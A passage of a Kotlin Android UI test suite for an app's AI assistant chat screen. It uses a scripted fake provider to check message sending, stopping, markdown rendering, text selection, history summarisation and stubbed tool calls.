package ru.adsrv.frpjump.ui.settings

import ru.adsrv.frpjump.assistant.chat.*
import android.content.pm.ActivityInfo
import android.content.res.Configuration
import android.os.SystemClock
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.consumeWindowInsets
import androidx.compose.foundation.layout.ime
import androidx.compose.foundation.layout.navigationBars
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.ui.unit.dp
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.test.*
import androidx.compose.ui.graphics.asAndroidBitmap
import androidx.compose.ui.semantics.getOrNull
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.geometry.Rect
import androidx.compose.ui.platform.LocalTextToolbar
import androidx.compose.ui.platform.TextToolbar
import androidx.compose.ui.platform.TextToolbarStatus
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalConfiguration
import java.util.Locale
import androidx.compose.ui.test.junit4.createAndroidComposeRule
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import androidx.navigation.compose.*
import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.platform.app.InstrumentationRegistry
import kotlinx.coroutines.*
import kotlinx.serialization.json.*
import org.junit.Assert.*
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import ru.adsrv.frpjump.agent.*
import ru.adsrv.frpjump.assistant.*
import ru.adsrv.frpjump.settings.ConfirmationMode
import ru.adsrv.frpjump.settings.SettingsStore
import ru.adsrv.frpjump.settings.ThemeMode
import ru.adsrv.frpjump.store.SecretBox
import ru.adsrv.frpjump.store.TextStorage
import ru.adsrv.frpjump.ui.FrpJumpTheme

@RunWith(AndroidJUnit4::class)
class AssistantChatScreenTest {
    @get:Rule val compose = createAndroidComposeRule<ComponentActivity>()
    private val args get() = InstrumentationRegistry.getArguments()
    private class Memory : TextStorage {
        @Volatile var value: String? = null
        @Volatile var failWrites = false
        @Volatile var beforeWrite: (() -> Unit)? = null
        override fun read() = value
        override fun write(text: String) { beforeWrite?.invoke(); if (failWrites) error("synthetic"); value = text }
        override fun delete() { value = null }
    }
    private class ToolsFixtureViewModel(store: SettingsStore) : ViewModel() {
        val tools = AssistantToolsBinding(store, viewModelScope)
    }
    private var settingsBinding: AssistantToolsBinding? = null
    private var chatBinding: AssistantToolsBinding? = null
    private var toolsBinding: AssistantToolsBinding? = null
    private val settingsFile = Memory()
    private val settings = SettingsStore(settingsFile).apply { update { it.copy(assistantEnabled = true) } }
    private val providerFile = Memory()
    private val store = AssistantProviderStore(providerFile, object : SecretBox {
        override fun seal(plain: String) = "synthetic-sealed"
        override fun open(sealed: String): String = error("Fake provider must not resolve credentials")
        override fun destroy() = Unit
    }, settings.assistantChat).apply { save(AssistantProviderDraft(AssistantProviderSettings(model = "synthetic"), null, "synthetic-key")) }
    private val prepEntered = java.util.concurrent.CountDownLatch(1)
    private val prepRelease = java.util.concurrent.CountDownLatch(1)
    private val formattedAnswer = "A **bold** year and *quiet* detail.\n\n- First item\n- Второй пункт\n\n`val answer = 42`\n\n```\n  code stays\n```"
    private val resourceAnswer = "[link](https://example.test) ![image](https://example.test/image) <b>literal</b>\n\n<img src=\"https://example.test/img\">"
    private val codeAnswer = "`C:\\`\n\n```\n  command \\ path\n    next\n```"
    private val longAnswer = (1..120).joinToString("\n") { "Line $it — длинный synthetic answer 🌍" }
    private var copySelection: (() -> Unit)? = null
    private val selectionToolbar = object : TextToolbar {
        override val status: TextToolbarStatus get() = if (copySelection == null) TextToolbarStatus.Hidden else TextToolbarStatus.Shown
        override fun hide() { copySelection = null }
        override fun showMenu(rect: Rect, onCopyRequested: (() -> Unit)?, onPasteRequested: (() -> Unit)?,
                              onCutRequested: (() -> Unit)?, onSelectAllRequested: (() -> Unit)?) {
            copySelection = onCopyRequested
        }
    }
    private var heldProviderReply = CompletableDeferred<Unit>()
    private var mode = "answer"
    private var calls = 0
    private var summaryCalls = 0
    private val requests = mutableListOf<AgentRequest>()
    /** Positive waits only: a loaded emulator can be slow, and a longer wait never turns a failure into a pass. */
    private val WAIT_MS = 15_000L
    private var owner: AssistantConversation? = null
    private var ownerSupport: ru.adsrv.frpjump.assistant.chat.ConfirmationSupport? = null
    private val module = AgentModule(true, { settings.assistantAvailability.disableVersion }, { settings.assistantAvailability.enabled })
    private var informationFixture: ProfileInformationFixture? = null
    private var history: AssistantChatHistory? = null
    private var historyCleanup: (() -> Unit)? = null
    /**
     * The soft keyboard belongs to the window, not to a test: one left open by an earlier test shrinks the screen of the next one
     * (a large-font list can drop to one line). Every test starts and ends with it hidden.
     */
    private fun hideKeyboard() {
        compose.activityRule.scenario.onActivity { activity ->
            androidx.core.view.WindowCompat.getInsetsController(activity.window, activity.window.decorView).hide(androidx.core.view.WindowInsetsCompat.Type.ime())
        }
    }
    @org.junit.After fun closeInformationFixture() { hideKeyboard(); informationFixture?.close(); historyCleanup?.invoke() }
    private var information = ru.adsrv.frpjump.profiles.ProfileInformation(
        kotlinx.coroutines.flow.MutableStateFlow(ru.adsrv.frpjump.profiles.ProfilesState(loaded = true,
            index = ru.adsrv.frpjump.profiles.ProfileIndex(listOf(ru.adsrv.frpjump.profiles.Profile("synthetic-profile", "Synthetic profile", "green", "never-export-alias"))))),
        kotlinx.coroutines.flow.MutableStateFlow(emptySet()),
    )
    private fun sshOver(state: kotlinx.coroutines.flow.MutableStateFlow<ru.adsrv.frpjump.profiles.ProfilesState>, hidden: kotlinx.coroutines.flow.MutableStateFlow<Set<String>>) =
        AssistantSshCommands(ru.adsrv.frpjump.ssh.SshTargets(state, hidden,
            ru.adsrv.frpjump.ssh.SshEnvironment(
                ru.adsrv.frpjump.ssh.SshKeyStore(Memory(), object : SecretBox {
                    override fun seal(plain: String): String = error("No SSH credentials")
                    override fun open(sealed: String): String = error("No SSH credentials")
                    override fun destroy() = Unit
                }), ru.adsrv.frpjump.ssh.SshPasswords(Memory(), object : SecretBox {
                    override fun seal(plain: String): String = error("No SSH credentials")
                    override fun open(sealed: String): String = error("No SSH credentials")
                    override fun destroy() = Unit
                }), { error("No SSH setup") }, ru.adsrv.frpjump.ssh.TmuxNames(Memory()),
                clientFactory = { error("No actual SSH") }),
        ))
    private var sshCommands = sshOver(kotlinx.coroutines.flow.MutableStateFlow(ru.adsrv.frpjump.profiles.ProfilesState(loaded = true)), kotlinx.coroutines.flow.MutableStateFlow(emptySet()))
    private var sshTarget = "synthetic" to "ssh"
    private var sshCommandText = "printf synthetic"
    /** The whole screen laid out right to left, as on a phone set to Arabic or Hebrew: only an explicit left-to-right command keeps its order. */
    private var forceRtl = false
    private var windowHeightDp: Int? = null
    /** The shipped assets, read through the app under test. */
    private val prompts = lazy { AssistantPrompts.load(InstrumentationRegistry.getInstrumentation().targetContext.assets::open) }
    private fun vm() = AssistantChatViewModel(settings, store, module, information, sshCommands, historyStore = history, prompts = prompts) {
        if (mode == "prepare") { prepEntered.countDown(); check(prepRelease.await(5, java.util.concurrent.TimeUnit.SECONDS)) }
        AgentProvider { request ->
            requests += request; calls++
            if (mode == "summary" && request.instructions == prompts.value.summary) {
                summaryCalls++
                return@AgentProvider AgentReply(summaryFacts(request.turns.single().user))
            }
            when (mode) {
                "summary" -> AgentReply(summaryFacts(request.turns.first().exchanges.first().reply.text))
                "resume-history" -> {
                    val previous = request.turns.first().exchanges.first().results.single()
                    val records = Json.parseToJsonElement(previous.text).jsonObject.getValue("results").jsonArray.map { it.jsonObject }
                    val chosen = records.first { it["profile"]!!.jsonObject["id"] == JsonPrimitive("work") &&
                        (it["connection"] as? JsonObject)?.get("id") == JsonPrimitive("work-root") }
                    AgentReply("Continued ${chosen["profile"]!!.jsonObject["id"]!!.jsonPrimitive.content} / ${chosen["connection"]!!.jsonObject["id"]!!.jsonPrimitive.content}")
                }
                "tool-ssh" -> if (request.turns.last().exchanges.isEmpty()) AgentReply(calls = listOf(
                    ToolCall("ssh-$calls", "ssh_command", kotlinx.serialization.json.buildJsonObject {
                        put("profile_id", kotlinx.serialization.json.JsonPrimitive(sshTarget.first))
                        put("connection_id", kotlinx.serialization.json.JsonPrimitive(sshTarget.second))
                        put("command", kotlinx.serialization.json.JsonPrimitive(sshCommandText))
                    }))) else AgentReply("Synthetic SSH target unavailable")
                "tool-ssh-two" -> if (request.turns.last().exchanges.isEmpty()) AgentReply(calls = listOf("first", "second").mapIndexed { i, name ->
                    ToolCall("ssh-two-$i", "ssh_command", kotlinx.serialization.json.buildJsonObject {
                        put("profile_id", kotlinx.serialization.json.JsonPrimitive(sshTarget.first))
                        put("connection_id", kotlinx.serialization.json.JsonPrimitive(sshTarget.second))
                        put("command", kotlinx.serialization.json.JsonPrimitive((1..10).joinToString("\n") { "$name-line-$it" }))
                    }) }) else AgentReply("Synthetic SSH target unavailable")
                "profile-results", "profile-results-provider-fail" -> if (request.turns.last().exchanges.isEmpty())
                    AgentReply(calls = listOf(ToolCall("profile-result-$calls", "profile_information", buildJsonObject { put("query", "board1500") })))
                    else {
                        val result = request.turns.last().exchanges.single().results.single()
                        assertEquals(ToolOutcome.SUCCESS, result.outcome); assertEquals(0, result.omittedChars)
                        val records = Json.parseToJsonElement(result.text).jsonObject["results"]!!.jsonArray.map { it.jsonObject }
                        val matches = records.filter { it["connection"] is JsonObject }
                        assertEquals(setOf("work-root", "work-admin", "home-root"), matches.map { it["connection"]!!.jsonObject["id"]!!.jsonPrimitive.content }.toSet())
                        if (mode == "profile-results-provider-fail") error("synthetic provider failure after selected information")
                        AgentReply(matches.joinToString("\n") { record ->
                            val c = record["connection"]!!.jsonObject
                            "${record["profile"]!!.jsonObject["name"]!!.jsonPrimitive.content} · ${c["device"]!!.jsonPrimitive.content} · ${c["name"]!!.jsonPrimitive.content} · ${c["kind"]!!.jsonPrimitive.content}:${c["port"]!!.jsonPrimitive.int} · ${c["user"]!!.jsonPrimitive.content}"
                        })
                    }
                "tool-information" -> if (request.turns.last().exchanges.isEmpty()) AgentReply(calls = listOf(
                    ToolCall("information-$calls", "profile_information", kotlinx.serialization.json.buildJsonObject { })))
                    else if (request.turns.last().exchanges.single().results.single().outcome == ToolOutcome.UNKNOWN_TOOL)
                        AgentReply("Profile information is disabled")
                    else AgentReply("App reports an unavailable synthetic profile")
                "search-failure-provider-fail" -> if (request.turns.last().exchanges.isEmpty()) AgentReply(calls = listOf(
                    ToolCall("search-$calls", "web_search", kotlinx.serialization.json.buildJsonObject {
                        put("query", kotlinx.serialization.json.JsonPrimitive("synthetic generated documentation query"))
                    }))) else error("synthetic provider failure after tool")
                "wait" -> awaitCancellation()
                "held-answer" -> { heldProviderReply.await(); AgentReply("late reply") }
                "error" -> error("synthetic-private-error")
                "formatted" -> AgentReply(formattedAnswer)
                "long" -> AgentReply(longAnswer)
                "resources" -> AgentReply(resourceAnswer)
                "code" -> AgentReply(codeAnswer)
                "current-omission" -> if (calls <= 3) AgentReply("x".repeat(9000), listOf(ToolCall("omitted-$calls", "unknown", kotlinx.serialization.json.buildJsonObject {}))) else AgentReply("Current omission complete")
                "long-context" -> AgentReply("z".repeat(9000))
                "tool-read", "tool-failure", "tool-read-provider-fail", "tool-failure-provider-fail" -> if (request.turns.last().exchanges.isEmpty()) AgentReply(calls = listOf(ToolCall("read-$calls", "read_page",
                    kotlinx.serialization.json.buildJsonObject { put("url", kotlinx.serialization.json.JsonPrimitive(if (mode.startsWith("tool-failure")) "http://127.0.0.1" else "https://public.org/doc")) })))
                    else if (mode.endsWith("provider-fail")) error("synthetic") else AgentReply("Answer from available text")
                else -> AgentReply("Complete answer $calls")
            }
        }
    }
    private fun summaryFacts(text: String) = listOf("target", "done", "unknown").joinToString("; ") { key ->
        "$key=" + (Regex("$key=([a-z-]+)").find(text)?.groupValues?.get(1) ?: error("Missing observed $key"))
    }
    @Test fun automaticSummaryPreservesReadableHistoryAndSelectedTarget() {
        val context = InstrumentationRegistry.getInstrumentation().targetContext
        val id = java.util.UUID.randomUUID().toString()
        val file = java.io.File(context.noBackupFilesDir, "test-summary-$id.json")
        val box = ru.adsrv.frpjump.store.KeystoreSecretBox("frpjump-test-summary-$id")
        val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate)
        historyCleanup = { scope.cancel(); file.delete(); box.destroy() }
        val snapshot = store.currentSnapshot
        store.save(AssistantProviderDraft(snapshot.settings!!.copy(contextTokens=12_000,outputTokens=512),snapshot.revision))
        history = AssistantChatHistory(ru.adsrv.frpjump.store.AtomicTextFile(file),box,scope)
        val records = (0 until 40).map { i ->
            val user = if (i==0) "target=work-root done=diagnostic unknown=upgrade" else "Progress $i"
            val reply = AgentExchange(AgentReply("received $i " + "x".repeat(160)))
            SavedTurn.of(AgentTurn(user,listOf(reply)))
        }
        history!!.save(SavedChat(records=records).bind(store.currentSnapshot.settings))
        runBlocking(Dispatchers.IO) { history!!.load() }
        mode="summary"; install(); compose.waitUntil(WAIT_MS) { owner?.state?.value?.loading==false }
        input().performTextInput("Continue selected target without repeating actions")
        sendAndAwait()
        val answer="target=work-root; done=diagnostic; unknown=upgrade"
        compose.runOnIdle {
            assertTrue(summaryCalls in 1..2); assertEquals(summaryCalls+1,calls)
            assertEquals(answer,owner!!.state.value.turns.last().answer)
            assertEquals(41,owner!!.state.value.turns.size); assertTrue(owner!!.state.value.summarized)
            assertEquals(records.first().user,owner!!.state.value.turns.first().user)
        }
        button("chat_back").performClick()
        runBlocking(Dispatchers.IO) { assertNotNull(history!!.load()!!.summary) }
        val previous=owner; val previousCalls=calls
        compose.onNodeWithTag("assistant_chat_entry").performClick()
        compose.waitUntil(WAIT_MS) { owner !== previous && owner?.state?.value?.loading==false }
        input().performTextInput("Продолжай"); sendAndAwait()
        compose.runOnIdle { assertEquals(previousCalls+1,calls); assertEquals(42,owner!!.state.value.turns.size); assertEquals(answer,owner!!.state.value.turns.last().answer) }
    }

    @Before fun display() {
        hideKeyboard()
        // This suite is runnable with normal discovery too; the safe explicit runner is required
        // by the operator's device procedure, not by an unconditional wrong-runner test failure.
        val landscape = args.getString("composerOrientation") == "landscape"
        compose.activityRule.scenario.onActivity {
            it.requestedOrientation = if (landscape) ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE else ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
        }
        val expected = if (landscape) Configuration.ORIENTATION_LANDSCAPE else Configuration.ORIENTATION_PORTRAIT
        val until = SystemClock.uptimeMillis() + 5000
        while (compose.activity.resources.configuration.orientation != expected && SystemClock.uptimeMillis() < until) SystemClock.sleep(50)
        assertEquals(expected, compose.activity.resources.configuration.orientation)
        assertEquals(args.getString("composerFontScale")?.toFloat() ?: 1f, compose.activity.resources.configuration.fontScale, .01f)
    }
    @Composable private fun Content() {
        val context = LocalContext.current
        val configuration = Configuration(LocalConfiguration.current).apply {
            setLocale(Locale.forLanguageTag(args.getString("chatLocale") ?: "en"))
        }
        val localized = context.createConfigurationContext(configuration)
        CompositionLocalProvider(LocalContext provides localized, LocalConfiguration provides configuration, LocalTextToolbar provides selectionToolbar,
            androidx.compose.ui.platform.LocalLayoutDirection provides (if (forceRtl) androidx.compose.ui.unit.LayoutDirection.Rtl else androidx.compose.ui.platform.LocalLayoutDirection.current)) {
        FrpJumpTheme(mode = if (args.getString("chatDark") == "true") ThemeMode.DARK else ThemeMode.LIGHT) {
            val nav = rememberNavController()
            // A short window (split screen, a small phone): the screen gets only this many dp of height (still the portrait layout, 400 dp or more).
            androidx.compose.foundation.layout.Box(windowHeightDp?.let { androidx.compose.ui.Modifier.fillMaxWidth().height(it.dp).consumeWindowInsets(androidx.compose.foundation.layout.WindowInsets.ime).consumeWindowInsets(androidx.compose.foundation.layout.WindowInsets.navigationBars) } ?: androidx.compose.ui.Modifier.fillMaxSize()) {
            NavHost(nav, "settings") {
                composable("settings") {
                    val vm = viewModel { ToolsFixtureViewModel(settings) }
                    var toolsOpen by androidx.compose.runtime.saveable.rememberSaveable { mutableStateOf(false) }
                    SideEffect { settingsBinding = vm.tools }
                    if (toolsOpen) {
                        SideEffect { toolsBinding = vm.tools }
                        AssistantToolsRoute(vm.tools, onBack = { toolsOpen = false })
                    } else androidx.compose.foundation.layout.Column {
                        Text("Outside chat")
                        AssistantChatEntry { nav.navigate("chat") }
                        AssistantToolsEntry { toolsOpen = true }
                    }
                }
                composable("chat") {
                    val vm = viewModel { vm() }
                    SideEffect { owner = vm.conversation; chatBinding = vm.tools; ownerSupport = vm.confirmations }
                    AssistantChatScreen(vm, onBack = { nav.popBackStack() },
                        onSetup = { nav.navigate("setup") })
                }
                composable("setup") { Text("Synthetic provider setup") }
            }
            }
        }
    }
    }
    /**
     * The chosen language applies to the activity itself, not only to the screen's composition: a Dialog is its own window with its own
     * composition view, which reads the activity's resources (in the app the language is set process-wide through AppCompat).
     */
    @Suppress("DEPRECATION")
    private fun localizeActivity(activity: ComponentActivity) {
        val configuration = Configuration(activity.resources.configuration).apply { setLocale(Locale.forLanguageTag(args.getString("chatLocale") ?: "en")) }
        activity.resources.updateConfiguration(configuration, activity.resources.displayMetrics)
    }
    private fun install(activity: ComponentActivity) { localizeActivity(activity); activity.setContent { Content() } }
    private fun install() {
        compose.activityRule.scenario.onActivity { install(it) }
        compose.onNodeWithTag("assistant_chat_entry").assertIsDisplayed().performClick()
    }
    private fun input() = button("chat_input")
    /**
     * Waits until [tag] has stopped moving. The soft keyboard slides the screen's content with a system animation that Compose's idling does
     * not wait for: a click injected at the node's bounds mid-slide lands where the button was and does nothing (seen in RU portrait at
     * 100% font: a Send or Stop that never happened). Positive wait: three equal readings 100 ms apart, at most 5 s.
     */
    private fun settle(tag: String) {
        var last: androidx.compose.ui.geometry.Rect? = null; var stable = 0
        val until = SystemClock.uptimeMillis() + 5000
        while (stable < 3 && SystemClock.uptimeMillis() < until) {
            val now = runCatching { bounds(tag) }.getOrNull()
            if (now != null && now == last) stable++ else { stable = 0; last = now }
            compose.waitForIdle(); SystemClock.sleep(100)
        }
    }
    private fun button(tag: String): SemanticsNodeInteraction {
        if (tag == "chat_tools") toolsBinding = chatBinding
        if (tag == "chat_send" || tag == "chat_stop") settle(tag)
        val node = compose.onNodeWithTag(tag)
        // Scroll only when the compact layout supplies a scrolling parent.
        if (compose.activity.resources.configuration.orientation == Configuration.ORIENTATION_LANDSCAPE) node.performScrollTo()
        return node
    }
    private fun toolToggle(id: String) = compose.onNode(hasAnyAncestor(hasTestTag("tool_$id")) and isToggleable())
        .performScrollTo().assertIsDisplayed()
    private fun localizedText(id: Int): String {
        val config = Configuration(compose.activity.resources.configuration).apply { setLocale(Locale.forLanguageTag(args.getString("chatLocale") ?: "en")) }
        return compose.activity.createConfigurationContext(config).getString(id)
    }
    private fun committedTool(id: String): Boolean = settings.assistantAvailability.tools.let {
        when (id) { "web_search" -> it.search; "read_page" -> it.readPage; "inspect_image" -> it.inspectImage; "profile_information" -> it.profileInformation; "ssh_command" -> it.sshCommand; else -> error("Unknown test tool") }
    }
    private fun awaitToolSaved(id: String, enabled: Boolean) {
        fun snapshot(): String {
            val node = compose.onAllNodes(hasAnyAncestor(hasTestTag("tool_$id")) and isToggleable()).fetchSemanticsNodes().singleOrNull()
            val current = settings.settings.value
            return "tool=$id expected=$enabled committed=${committedTool(id)} observable=${current.assistantSearch}/${current.assistantReadPage}/${current.assistantInspectImage} presentation=${toolsBinding?.state?.value} rendered=${node?.config?.getOrNull(androidx.compose.ui.semantics.SemanticsProperties.ToggleableState)} enabled=${node != null && !node.config.contains(androidx.compose.ui.semantics.SemanticsProperties.Disabled)} busy=${owner?.state?.value?.busy}"
        }
        try {
            compose.waitUntil(WAIT_MS) {
                val node = compose.onAllNodes(hasAnyAncestor(hasTestTag("tool_$id")) and isToggleable()).fetchSemanticsNodes().singleOrNull()
                committedTool(id) == enabled && toolsBinding?.state?.value?.let { state ->
                    state.committed == settings.assistantAvailability.tools && id !in state.pending && id !in state.failed
                } == true && node != null &&
                    node.config[androidx.compose.ui.semantics.SemanticsProperties.ToggleableState] ==
                        (if (enabled) androidx.compose.ui.state.ToggleableState.On else androidx.compose.ui.state.ToggleableState.Off) &&
                    !node.config.contains(androidx.compose.ui.semantics.SemanticsProperties.Disabled)
            }
        } catch (failure: androidx.compose.ui.test.ComposeTimeoutException) {
            val details = snapshot()
            val target = java.io.File(compose.activity.getExternalFilesDir(null), "r5-tool-save-failure-$id.png")
            InstrumentationRegistry.getInstrumentation().uiAutomation.takeScreenshot()?.let { bitmap ->
                target.outputStream().use { bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, it) }; bitmap.recycle()
            }
            throw AssertionError("Tool save acknowledgement failed: $details; screenshot=${target.name}", failure)
        }
    }
    private fun awaitIdle() {
        try { compose.waitUntil(WAIT_MS) { owner?.state?.value?.busy == false } }
        catch (e: androidx.compose.ui.test.ComposeTimeoutException) {
            val s = owner?.state?.value
            runCatching { shot("timeout-idle") }
            throw AssertionError("never idle: " + diagnose("never-idle"), e)
        }
    }
    /**
     * Clicks Send and waits until that Send has really run and ended. Under a loaded emulator a Send may not have
     * turned busy yet when the click returns, and a fast one can be busy for less than a frame, so "not busy" alone
     * could return before it ran: wait for its result too (a new request, a new turn, a changed problem or the draft
     * taken), then for "not busy".
     */
    private fun sendAndAwait() {
        val before = owner!!.state.value; val requested = requests.size
        button("chat_send").performClick()
        try {
            compose.waitUntil(WAIT_MS) {
                val now = owner?.state?.value ?: return@waitUntil false
                !now.busy && (requests.size > requested || now.turns.size != before.turns.size ||
                    now.problem != before.problem || now.draft != before.draft)
            }
        } catch (e: androidx.compose.ui.test.ComposeTimeoutException) { throw AssertionError("send did not complete: " + diagnose("no-send"), e) }
    }
    private fun awaitMarkdown() {
        compose.waitUntil(WAIT_MS) { compose.onAllNodesWithTag("assistant_markdown_rendered").fetchSemanticsNodes().isNotEmpty() }
    }

    @Test fun sendFollowupStopErrorAndRecovery() {
        install()
        compose.runOnIdle { assertEquals(0, calls) }
        input().performTextInput("First message")
        sendAndAwait()
        compose.runOnIdle { assertEquals("Complete answer 1", owner!!.state.value.turns.single().answer) }
        button("chat_history").performScrollToNode(hasText("Complete answer 1"))
        compose.onNodeWithText("Complete answer 1").assertIsDisplayed()
        input().performTextInput("Second message")
        sendAndAwait()
        compose.runOnIdle { assertEquals(2, requests[1].turns.size); assertEquals("First message", requests[1].turns.first().user); mode = "wait" }
        input().performTextInput("Recover this text")
        button("chat_send").performClick()
        compose.waitUntil(WAIT_MS) { owner!!.state.value.busy }
        button("chat_stop").assertIsDisplayed().performClick(); awaitIdle()
        input().assertTextContains("Recover this text")
        compose.runOnIdle { mode = "error" }
        sendAndAwait()
        button("chat_error").assertIsDisplayed()
        input().assertTextContains("Recover this text")
        compose.runOnIdle { mode = "answer" }
        sendAndAwait()
        compose.runOnIdle { assertEquals(3, owner!!.state.value.turns.size); assertEquals(3, requests.last().turns.size) }
    }

    @Test fun formattedAndLongAnswersRemainSelectableAndOriginalHistoryIsUnchanged() {
        mode = "formatted"
        install()
        input().performTextInput("Literal **question**")
        sendAndAwait()
        compose.runOnIdle { assertEquals(formattedAnswer, owner!!.state.value.turns.single().answer) }
        compose.activityRule.scenario.onActivity {
            (it.getSystemService(android.content.Context.INPUT_METHOD_SERVICE) as android.view.inputmethod.InputMethodManager)
                .hideSoftInputFromWindow(it.window.decorView.windowToken, 0)
        }
        compose.waitForIdle(); awaitMarkdown()
        button("chat_history").performScrollToNode(hasText("A bold year", substring = true))
        compose.onNodeWithText("Literal **question**").assertExists()
        val answer = compose.onNodeWithText("A bold year", substring = true)
        answer.assertIsDisplayed().assertTextEquals("A bold year and quiet detail.")
        compose.onNodeWithText("First item").assertExists()
        compose.onNodeWithText("Второй пункт").assertExists()
        compose.onNodeWithText("-").assertDoesNotExist()
        compose.onNodeWithText("val answer = 42", substring = true).assertExists()
        compose.onNodeWithText("  code stays\n", substring = true).assertExists()
        if (args.getString("captureChatScreenshot") == "true") {
            compose.waitForIdle()
            val name = "chat-${args.getString("chatLocale") ?: "en"}-${args.getString("chatDark") ?: "false"}-${args.getString("composerOrientation") ?: "portrait"}-${args.getString("composerFontScale") ?: "1"}.png"
            val target = java.io.File(compose.activity.getExternalFilesDir(null), name)
            InstrumentationRegistry.getInstrumentation().uiAutomation.takeScreenshot().let { bitmap ->
                target.outputStream().use { bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, it) }
                bitmap.recycle()
            }
        }
        answer.performTouchInput { longClick(Offset(20f, 20f)) }
        compose.waitUntil(WAIT_MS) { copySelection != null }
        compose.runOnIdle { assertNotNull(copySelection); mode = "long" }
        input().performTextInput("Next")
        sendAndAwait()
        compose.runOnIdle {
            assertEquals(longAnswer, owner!!.state.value.turns.last().answer)
            assertEquals(formattedAnswer, requests.last().turns.first().exchanges.last().reply.text)
        }
        button("chat_history").performScrollToNode(hasText("Line 120", substring = true))
        compose.waitUntil(WAIT_MS) { compose.onAllNodesWithTag("assistant_markdown_loading").fetchSemanticsNodes().isEmpty() }
        compose.onNodeWithText("Line 120", substring = true).assertExists().assertTextEquals(longAnswer)
    }

    @Test fun resourceMarkupIsVisibleAndHasNoClickAction() {
        mode = "resources"
        install()
        input().performTextInput("Show resources")
        sendAndAwait(); awaitMarkdown()
        button("chat_history").performScrollToNode(hasText("[link](https://example.test)", substring = true))
        compose.onNodeWithText("[link](https://example.test)", substring = true)
            .assertExists().assertHasNoClickAction()
            .assertTextContains("![image](https://example.test/image)", substring = true)
            .assertTextContains("<b>literal</b>", substring = true)
        compose.onNodeWithText("<img src=\"https://example.test/img\">", substring = true)
            .assertExists().assertHasNoClickAction()
        compose.runOnIdle { assertEquals(resourceAnswer, owner!!.state.value.turns.single().answer) }
    }

    @Test fun codePayloadIsSelectableAndOriginalIsSentInFollowup() {
        mode = "code"
        install()
        input().performTextInput("Code please")
        sendAndAwait(); awaitMarkdown()
        button("chat_history").performScrollToNode(hasText("C:\\", substring = true))
        val inline = compose.onNodeWithText("C:\\", substring = true).assertIsDisplayed()
        compose.onNodeWithText("  command \\ path\n    next\n", substring = true).assertExists()
        inline.performTouchInput { longClick(Offset(20f, 20f)) }
        compose.waitUntil(WAIT_MS) { copySelection != null }
        compose.runOnIdle { assertNotNull(copySelection); mode = "answer" }
        input().performTextInput("Next")
        sendAndAwait()
        compose.runOnIdle {
            assertEquals(codeAnswer, owner!!.state.value.turns.first().answer)
            assertEquals(codeAnswer, requests.last().turns.first().exchanges.last().reply.text)
        }
    }

    @Test fun parsingFailureShowsSelectableOriginalAnswer() {
        val original = "Raw **answer** with \\ and https://example.test"
        compose.activityRule.scenario.onActivity { activity ->
            activity.setContent {
                CompositionLocalProvider(LocalTextToolbar provides selectionToolbar) {
                    FrpJumpTheme(mode = ThemeMode.LIGHT) {
                        androidx.compose.foundation.text.selection.SelectionContainer {
                            AssistantAnswerMarkdown(original, com.mikepenz.markdown.model.State.Error(IllegalStateException("synthetic")))
                        }
                    }
                }
            }
        }
        val text = compose.onNodeWithText(original).assertIsDisplayed().assertHasNoClickAction()
        text.performTouchInput { longClick(Offset(20f, 20f)) }
        compose.waitUntil(WAIT_MS) { copySelection != null }
        compose.runOnIdle { assertNotNull(copySelection) }
    }

    @Test fun recreationRetainsActualBackStackOwnerAndPopDiscards() {
        install()
        input().performTextInput("First")
        sendAndAwait()
        input().performTextInput("Draft only in memory")
        lateinit var before: AssistantConversation
        compose.runOnIdle { before = owner!! }
        compose.activityRule.scenario.recreate()
        compose.activityRule.scenario.onActivity { install(it) }
        compose.waitForIdle()
        compose.runOnIdle { assertSame(before, owner); assertEquals(1, owner!!.state.value.turns.size) }
        input().assertTextContains("Draft only in memory")
        button("chat_back").performClick()
        compose.onNodeWithText("Outside chat").assertExists()
        compose.waitUntil(WAIT_MS) { before.state.value == ChatState() }
    }

    @Test fun disabledSetupHasDirectRecovery() {
        settings.update { it.copy(assistantEnabled = false) }
        install()
        button("chat_setup").assertIsDisplayed().performClick()
        compose.onNodeWithText("Synthetic provider setup").assertExists()
        compose.runOnIdle { assertEquals(0, calls) }
    }
    @Test fun unreadableProviderHasDirectSetupWithoutRequests() {
        providerFile.value = "unreadable synthetic document"
        store.reload()
        install()
        button("chat_setup").assertIsDisplayed().performClick()
        compose.onNodeWithText("Synthetic provider setup").assertExists()
        compose.runOnIdle { assertEquals(0, calls) }
    }

    @Test fun popDuringPreparationAndReopenKeepsGlobalSlotWithoutOldText() {
        mode = "prepare"
        install()
        input().performTextInput("Private old draft")
        button("chat_send").performClick()
        assertTrue(prepEntered.await(3, java.util.concurrent.TimeUnit.SECONDS))
        try {
            button("chat_back").performClick()
            compose.onNodeWithTag("assistant_chat_entry").performClick()
            button("chat_stop").assertIsDisplayed().assertIsNotEnabled()
            compose.onNodeWithText("Private old draft").assertDoesNotExist()
            compose.runOnIdle { assertEquals(0, calls); assertTrue(owner!!.state.value.turns.isEmpty()) }
        } finally { prepRelease.countDown() }
        awaitIdle()
        compose.runOnIdle { mode = "answer" }
        input().performTextInput("New draft")
        sendAndAwait()
        compose.runOnIdle { assertEquals(1, calls); assertEquals("New draft", owner!!.state.value.turns.single().user) }
        val russian = Configuration(compose.activity.resources.configuration).apply { setLocale(Locale.forLanguageTag("ru")) }
        val resources = compose.activity.createConfigurationContext(russian).resources
        val hint = resources.getString(ru.adsrv.frpjump.R.string.assistant_provider_stage_hint)
        assertTrue(hint.contains(resources.getString(ru.adsrv.frpjump.R.string.assistant_provider_models)))
        assertTrue(hint.contains(resources.getString(ru.adsrv.frpjump.R.string.chat_send)))
    }

    @Test fun toolsEntrySwitchesFailedSaveAndRecreationAreInert() {
